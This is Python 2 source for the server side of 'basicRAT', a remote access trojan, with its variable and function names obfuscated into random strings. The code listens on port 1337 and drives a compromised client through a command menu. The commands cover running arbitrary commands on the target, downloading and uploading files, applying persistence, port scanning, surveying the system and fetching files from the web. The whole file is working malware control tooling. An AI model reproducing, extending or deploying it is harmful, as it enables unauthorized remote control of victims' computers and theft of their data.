#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import LTqWdFNAWGRrOFnEzPNXLrpSVbprqLyx,NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy,BBaZpepdXruqObrkEWSXhfoFORKlTPhH
    from core.filesock import CjLXxPxHYyQurzSYeNzJAXdgNVMivrcn, HOhRIwHVlAgUqVdUvEaVGenLqGggxwgI
except ImportError as pMVxwifEscoMgjwKQjQtaCCTOOnMIwAu:
    print pMVxwifEscoMgjwKQjQtaCCTOOnMIwAu
    sys.exit(0)
gbQrwOwNBREPAUGOuPyQlsCMSbtnasrZ = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
icSwmgJRLFgpKaaWkNJPcoVfHFtjYtVa = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
zFerQhawnnHloYDQSTgSIsXyTXmoluLi = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
vHeZhnhgEqXmbDFpybVDhpwHIjRcEpDs = """a""" + "HELP_TEXT"
dpFCfGeDzAOgmSmVlTQOYfOaoHattzIk = '''HELP_TEXT''' + gbQrwOwNBREPAUGOuPyQlsCMSbtnasrZ + '''COMMANDS'''
mlWlBePcWSPHCSDWeHYFUwnufmevKgVt = "COMMANDS"
nARPkqeyKBYpIMnHWetIXbXoINvBkZIT = 'HELP_TEXT' + 'COMMANDS' + "HELP_TEXT"
def RBFZNPauhPYFpVcTmMUEclYvnYPgEGDQ():
    qDnfrkIHfAdYMYsCiSKrxUXRLUpwvQec = argparse.ArgumentParser(description='basicRAT server')
    qDnfrkIHfAdYMYsCiSKrxUXRLUpwvQec.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return qDnfrkIHfAdYMYsCiSKrxUXRLUpwvQec
def ARapBniKLiaAZCSaLgmdlKpFDogIzsra():
    bkXkzkaayuetRKoOyVPMevuRKavUqrUg = 'NQMHSExVSdpUULyxGNJhaLvUEGfadwiL'
class VqrQDYufKcnIuuqFVgOwOTKuwvrhTrtA:
    OQMcCjVkqEfHAooBbqCuWCHDcsVLcyOi = 'ciaFAVidOykNCetYTtFeHwapASquIWiR'
def sNoJVUCNkupeUOKOlykohvVVATYLlHgq():
    qDnfrkIHfAdYMYsCiSKrxUXRLUpwvQec  = RBFZNPauhPYFpVcTmMUEclYvnYPgEGDQ()
    PZsmJajhLyTVKGdchdpJeqZreNWYUvXQ    = vars(qDnfrkIHfAdYMYsCiSKrxUXRLUpwvQec.parse_args())
    NaVomwpdVmJpNUGzNteCROfjsVqJJIDL    = PZsmJajhLyTVKGdchdpJeqZreNWYUvXQ['port']
    KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.bind(('0.0.0.0', NaVomwpdVmJpNUGzNteCROfjsVqJJIDL))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(NaVomwpdVmJpNUGzNteCROfjsVqJJIDL)
        sys.exit(1)
    for HbTGHvBEGLmfFYLeDbcZcLjLhphVhgbU in icSwmgJRLFgpKaaWkNJPcoVfHFtjYtVa.split('\n'):
        time.sleep(0.05)
        print HbTGHvBEGLmfFYLeDbcZcLjLhphVhgbU
    print 'basicRAT server listening on port {}...'.format(NaVomwpdVmJpNUGzNteCROfjsVqJJIDL)
    KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.listen(10)
    nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy, RFeLIJjcxvGtFSBaSYHUExctwUVoUKws = KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.accept()
    nhAzDhVeHXftyUzuSMthbMqfazPcclpY = BBaZpepdXruqObrkEWSXhfoFORKlTPhH(nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy, server=True)
    while True:
        KrXAgkBJEywqfGGQtuyHbenZdcaBuEAp = raw_input('\n[{}] basicRAT> '.format(RFeLIJjcxvGtFSBaSYHUExctwUVoUKws[0])).rstrip()
        if not KrXAgkBJEywqfGGQtuyHbenZdcaBuEAp:
            continue
        IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud, _, action = KrXAgkBJEywqfGGQtuyHbenZdcaBuEAp.partition(' ')
        if IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud not in zFerQhawnnHloYDQSTgSIsXyTXmoluLi:
            print 'Invalid command, type "help" to see a list of commands.'
            continue
        if IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'help':
            print gbQrwOwNBREPAUGOuPyQlsCMSbtnasrZ
            continue
        nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy.send(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(KrXAgkBJEywqfGGQtuyHbenZdcaBuEAp, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
        if IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'quit':
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.close()
            sys.exit(0)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'run':
            CLczFwfqKquRoaZMCgNpeLQzAhRJGVGR = nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy.recv(4096)
            print LTqWdFNAWGRrOFnEzPNXLrpSVbprqLyx(CLczFwfqKquRoaZMCgNpeLQzAhRJGVGR, nhAzDhVeHXftyUzuSMthbMqfazPcclpY).rstrip()
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'download':
            for RJJtPMsJNduwmrIJzEAYvWHbExNuMYns in action.split():
                RJJtPMsJNduwmrIJzEAYvWHbExNuMYns = RJJtPMsJNduwmrIJzEAYvWHbExNuMYns.strip()
                CjLXxPxHYyQurzSYeNzJAXdgNVMivrcn(nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy, RJJtPMsJNduwmrIJzEAYvWHbExNuMYns, nhAzDhVeHXftyUzuSMthbMqfazPcclpY)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'upload':
            for RJJtPMsJNduwmrIJzEAYvWHbExNuMYns in action.split():
                RJJtPMsJNduwmrIJzEAYvWHbExNuMYns = RJJtPMsJNduwmrIJzEAYvWHbExNuMYns.strip()
                HOhRIwHVlAgUqVdUvEaVGenLqGggxwgI(nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy, RJJtPMsJNduwmrIJzEAYvWHbExNuMYns, nhAzDhVeHXftyUzuSMthbMqfazPcclpY)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'rekey':
            nhAzDhVeHXftyUzuSMthbMqfazPcclpY = BBaZpepdXruqObrkEWSXhfoFORKlTPhH(nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy, server=True)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud)
            CLczFwfqKquRoaZMCgNpeLQzAhRJGVGR = nSMMERBBwXwyPzIqGAQNYrUVwsNoCfOy.recv(1024)
            print LTqWdFNAWGRrOFnEzPNXLrpSVbprqLyx(CLczFwfqKquRoaZMCgNpeLQzAhRJGVGR, nhAzDhVeHXftyUzuSMthbMqfazPcclpY)
if __name__ == '__main__':
    sNoJVUCNkupeUOKOlykohvVVATYLlHgq()
